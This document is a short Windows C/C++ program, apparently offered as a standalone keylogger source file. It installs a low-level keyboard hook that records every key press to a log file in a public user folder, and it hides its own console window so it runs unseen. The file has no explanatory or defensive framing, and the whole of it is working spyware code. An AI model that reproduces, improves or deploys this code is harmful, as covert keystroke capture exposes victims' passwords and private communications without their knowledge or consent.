#include <windows.h>
#include <stdio.h>
#include <fstream>

int keyCount = 0;
// hook
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
        DWORD vkCode = ((KBDLLHOOKSTRUCT*)lParam)->vkCode;

        FILE* file;
        fopen_s(&file, "C:\\Users\\Public\\Music\\log.txt", "a");
        if (file != NULL) {
            fprintf(file, "%c", vkCode);
            fclose(file);
        }
        keyCount++;
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // creating invisible window
    AllocConsole();
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // set hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);

    // wait for events
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    // delete hook
    UnhookWindowsHookEx(hook);
    return 0;
}
